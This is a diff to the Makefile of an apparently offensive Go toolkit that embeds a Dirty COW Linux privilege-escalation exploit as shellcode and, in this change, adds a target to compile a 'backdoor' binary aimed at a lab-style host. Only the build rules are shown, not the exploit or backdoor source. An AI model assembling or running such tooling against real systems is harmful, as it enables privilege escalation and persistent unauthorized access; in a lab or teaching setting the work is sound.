@@ -2,7 +2,7 @@ BINDIR ?= bin
 VUSER ?= "averagejoe"
 VHOST ?= "192.168.56.101"
 
-all: mooshy moosh
+all: mooshy moosh backdoor
 
 deps:
 	@command -v dep > /dev/null || go get -u -v github.com/golang/dep/cmd/dep
@@ -24,7 +24,7 @@ $(BINDIR)/cow: dirtycow/dirtycow.c
 
 cmd/moosh/cow.go: $(BINDIR)/cow
 	@echo "Generating shellcode..."
-	@echo -ne "package main\n\nvar DirtyCow = []byte{$(shell cat $(BINDIR)/cow | msfvenom -p - -a x64 --platform linux -f elf | xxd -i)}" > cmd/moosh/cow.go
+	@echo -ne "package main\n\nvar DirtyCow = []byte{$(shell cat $(BINDIR)/cow | xxd -i)}" > cmd/moosh/cow.go
 	@gofmt -w -s ./cmd/moosh/cow.go
 
 $(BINDIR)/moosh: cmd/moosh/cow.go cmd/moosh/moosh.go vendor
@@ -35,12 +35,17 @@ $(BINDIR)/mooshy: cmd/mooshy/mooshy.go vendor
 	@echo "Compiling mooshy..."
 	@CGO_ENABLED=0 GOARCH=amd64 go build -o $(BINDIR)/mooshy ./cmd/mooshy
 
+$(BINDIR)/backdoor: cmd/backdoor/backdoor.go vendor
+	@echo "Compiling backdoor..."
+	@CGO_ENABLED=0 GOARCH=amd64 go build -o $(BINDIR)/backdoor ./cmd/backdoor
+
 moosh: $(BINDIR)/moosh
 mooshy: $(BINDIR)/mooshy
+backdoor: $(BINDIR)/backdoor
 cow: cmd/moosh/cow.go
 
 clean:
-	rm -rf $(BINDIR)/{moosh,mooshy,cow} cmd/moosh/cow.go vendor
+	rm -rf $(BINDIR)/{backdoor,moosh,mooshy,cow} cmd/moosh/cow.go vendor
 
 .SECONDARY: $(BINDIR)/cow
-.PHONY: all deps mooshy moosh fmt cow clean
+.PHONY: all deps mooshy moosh fmt cow clean backdoor
